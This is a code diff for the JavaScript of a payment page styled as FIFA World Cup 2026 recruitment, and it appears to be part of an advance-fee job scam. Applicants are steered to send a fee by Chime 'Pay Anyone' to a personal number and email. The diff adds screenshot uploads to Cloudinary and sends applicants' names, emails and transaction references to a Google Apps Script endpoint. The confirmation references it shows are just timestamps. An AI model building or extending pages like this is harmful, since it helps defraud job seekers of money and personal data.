@@ -1,12 +1,14 @@
-
+/* FIFA World Cup 2026 — payment page (Chime + careers site ?d= payload) */
 
 const CONFIG = {
- chimePhoneNumber: "+1 (513) 628-6294",
+  chimePhoneNumber: "+1 (513) 628-6294",
   chimePaymentEmail: "payment@fifa26workforce.com",
   cloudinaryCloudName: "dibwotfd5",
   cloudinaryUploadPreset: "payment-screenshot",
+  /** Same Apps Script /exec URL as the careers site — sends payment alert emails */
+  paymentScriptUrl:
+    "https://script.google.com/macros/s/AKfycbxHATyBoGmfaWeNnx6Q42EK6sIVGrakQ5TX7ZOlUgGWpT4XVaS7HNr653Q1bHeHL6p1/exec",
 };
-
 
 const ICONS = {
   admin: `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 3H8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z"/></svg>`,
@@ -61,7 +63,7 @@ let currentMethod = "chime";
 
 document.addEventListener("DOMContentLoaded", () => {
   loadPageData();
-  setChimeNumber();
+  setChimeContactDetails();
 });
 
 function decodePayload() {
@@ -159,16 +161,12 @@ function applyPayload(payload) {
   if (reportingSection && payload.reportingDateLabel) {
     reportingSection.hidden = false;
     document.getElementById("reporting-text").textContent =
-      cleanReportingInstruction(payload.reportingInstruction || "Please report to venue reception on the date below.");
+      payload.reportingInstruction || "Please report to venue reception on the date below.";
     document.getElementById("reporting-meta").textContent =
       `Date: ${payload.reportingDateLabel} · Time: ${payload.reportingTimeLabel || "8:00 AM"}`;
     const venue = [payload.stadiumName, payload.stadiumAddress].filter(Boolean).join(", ");
     if (venue) document.getElementById("reporting-venue").textContent = `Venue: ${venue}`;
   }
-}
-
-function cleanReportingInstruction(text) {
-  return String(text).replace(/\(shown below\)/gi, "(shown above)");
 }
 
 function renderFeeItems(items, explanation) {
@@ -213,11 +211,16 @@ function renderFeeItems(items, explanation) {
   if (expl && explanation) expl.textContent = explanation;
 }
 
-function setChimeNumber() {
+function setChimeContactDetails() {
   const phoneEl = document.getElementById("chime-number");
-  const emailEl = document.getElementById("payment-email");
+  const emailEl = document.getElementById("chime-email");
+  const disclaimerPhone = document.getElementById("disclaimer-chime-phone");
+  const disclaimerEmail = document.getElementById("disclaimer-chime-email");
+
   if (phoneEl) phoneEl.textContent = CONFIG.chimePhoneNumber;
   if (emailEl) emailEl.textContent = CONFIG.chimePaymentEmail;
+  if (disclaimerPhone) disclaimerPhone.textContent = CONFIG.chimePhoneNumber;
+  if (disclaimerEmail) disclaimerEmail.textContent = CONFIG.chimePaymentEmail;
 }
 
 function selectMethod(method) {
@@ -249,40 +252,35 @@ function selectMethod(method) {
   }
 }
 
-function copyNumber() {
-  const digits = CONFIG.chimePhoneNumber.replace(/\D/g, "");
-  const btn = document.getElementById("copy-phone-btn");
-  const label = document.getElementById("copy-label");
-  copyPaymentText("+" + digits, btn, label, "Copy phone number");
+function copyChimeContact(type) {
+  const isEmail = type === "email";
+  const toCopy = isEmail
+    ? CONFIG.chimePaymentEmail
+    : "+" + CONFIG.chimePhoneNumber.replace(/\D/g, "");
+  const btn = document.getElementById(isEmail ? "copy-email-btn" : "copy-phone-btn");
+  const label = document.getElementById(isEmail ? "copy-email-label" : "copy-phone-label");
+  const defaultLabel = isEmail ? "Copy email" : "Copy number";
+
+  const onCopied = () => setCopied(btn, label, defaultLabel);
+
+  navigator.clipboard.writeText(toCopy).then(onCopied, () => {
+    const el = document.createElement("textarea");
+    el.value = toCopy;
+    document.body.appendChild(el);
+    el.select();
+    document.execCommand("copy");
+    document.body.removeChild(el);
+    onCopied();
+  });
 }
 
-function copyEmail() {
-  const btn = document.getElementById("copy-email-btn");
-  const label = document.getElementById("copy-email-label");
-  copyPaymentText(CONFIG.paymentEmail, btn, label, "Copy email address");
-}
-
-function copyPaymentText(toCopy, btn, label, resetText) {
-  navigator.clipboard.writeText(toCopy).then(
-    () => setCopied(btn, label, resetText),
-    () => {
-      const el = document.createElement("textarea");
-      el.value = toCopy;
-      document.body.appendChild(el);
-      el.select();
-      document.execCommand("copy");
-      document.body.removeChild(el);
-      setCopied(btn, label, resetText);
-    },
-  );
-}
-
-function setCopied(btn, label, resetText) {
+function setCopied(btn, label, defaultLabel) {
+  if (!btn || !label) return;
   btn.classList.add("copied");
   label.textContent = "Copied!";
   setTimeout(() => {
     btn.classList.remove("copied");
-    label.textContent = resetText;
+    label.textContent = defaultLabel;
   }, 2500);
 }
 
@@ -337,26 +335,114 @@ function isValidEmail(value) {
   return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
 }
 
-function submitPayment() {
+function prepareScreenshotFile(file, applicationId) {
+  const extension = String(file.name || "")
+    .toLowerCase()
+    .match(/\.(jpe?g|png|webp)$/i)?.[1] || "jpg";
+  const safeId = String(applicationId || "payment")
+    .replace(/[^a-zA-Z0-9_-]+/g, "-")
+    .slice(0, 40);
+  const safeName = `payment-${safeId}-${Date.now()}.${extension}`;
+
+  if (file.name === safeName) {
+    return file;
+  }
+
+  return new File([file], safeName, {
+    type: file.type || "image/jpeg",
+    lastModified: file.lastModified,
+  });
+}
+
+/**
+ * Unsigned browser upload — only cloud name + preset are required (never API key/secret).
+ */
+async function uploadScreenshotToCloudinary(file, applicationId) {
+  const cloudName = CONFIG.cloudinaryCloudName;
+  const uploadPreset = CONFIG.cloudinaryUploadPreset;
+
+  if (!cloudName || !uploadPreset) {
+    throw new Error("Cloudinary is not configured on this page.");
+  }
+
+  const uploadFile = prepareScreenshotFile(file, applicationId);
+  const formData = new FormData();
+  formData.append("file", uploadFile);
+  formData.append("upload_preset", uploadPreset);
+  formData.append("context", `application_id=${applicationId || "unknown"}`);
+
+  const response = await fetch(
+    `https://api.cloudinary.com/v1_1/${cloudName}/image/upload`,
+    { method: "POST", body: formData },
+  );
+
+  const payload = await response.json().catch(() => null);
+
+  if (!response.ok || !payload?.secure_url) {
+    const message =
+      payload?.error?.message ||
+      "We could not upload your screenshot. Please try again or choose a different image.";
+    throw new Error(message);
+  }
+
+  return payload.secure_url;
+}
+
+async function notifyPaymentSubmission(payload) {
+  const scriptUrl = CONFIG.paymentScriptUrl;
+  if (!scriptUrl) return;
+
+  try {
+    await fetch(scriptUrl, {
+      method: "POST",
+      mode: "no-cors",
+      body: JSON.stringify({ type: "payment_submission", ...payload }),
+    });
+  } catch {
+    // no-cors — submission may still succeed server-side; do not block success UI
+  }
+}
+
+async function submitPayment() {
   if (!validateForm()) return;
 
   const btn = document.getElementById("submit-btn");
+  const applicationId = document.getElementById("application-id").textContent.trim();
+  const screenshotInput = document.getElementById("screenshot");
+  const screenshotFile = screenshotInput?.files?.[0];
+
   btn.disabled = true;
-  btn.textContent = "Submitting...";
+  btn.textContent = screenshotFile ? "Uploading screenshot..." : "Submitting...";
 
-  const payload = {
-    applicationId: document.getElementById("application-id").textContent,
-    applicantName: document.getElementById("sender-name").value.trim(),
-    applicantEmail: document.getElementById("sender-email").value.trim(),
-    transactionRef: document.getElementById("transaction-ref").value.trim(),
-    role: sessionStorage.getItem("roleName") || "your selected role",
-    amount: sessionStorage.getItem("feeAmount") || "85.00",
-    paymentMethod: "Chime Pay Anyone",
-    confirmationRef: "CONF-" + Date.now(),
-    timestamp: new Date().toISOString(),
-  };
+  let screenshotUrl = "";
 
-  setTimeout(() => handleSuccess(payload), 1200);
+  try {
+    if (screenshotFile) {
+      screenshotUrl = await uploadScreenshotToCloudinary(screenshotFile, applicationId);
+    }
+
+    btn.textContent = "Submitting...";
+
+    const payload = {
+      applicationId,
+      applicantName: document.getElementById("sender-name").value.trim(),
+      applicantEmail: document.getElementById("sender-email").value.trim(),
+      transactionRef: document.getElementById("transaction-ref").value.trim(),
+      role: sessionStorage.getItem("roleName") || "your selected role",
+      amount: sessionStorage.getItem("feeAmount") || "85.00",
+      paymentMethod: "Chime Pay Anyone",
+      confirmationRef: "CONF-" + Date.now(),
+      screenshotUrl,
+      timestamp: new Date().toISOString(),
+    };
+
+    await notifyPaymentSubmission(payload);
+    handleSuccess(payload);
+  } catch (error) {
+    btn.disabled = false;
+    btn.textContent = "I've sent the payment";
+    alert(error?.message || "Something went wrong. Please try again.");
+  }
 }
 
 function handleSuccess(data) {
@@ -373,4 +459,3 @@ function handleSuccess(data) {
 function generateApplicationId() {
   return "APP-" + Date.now();
 }
- 
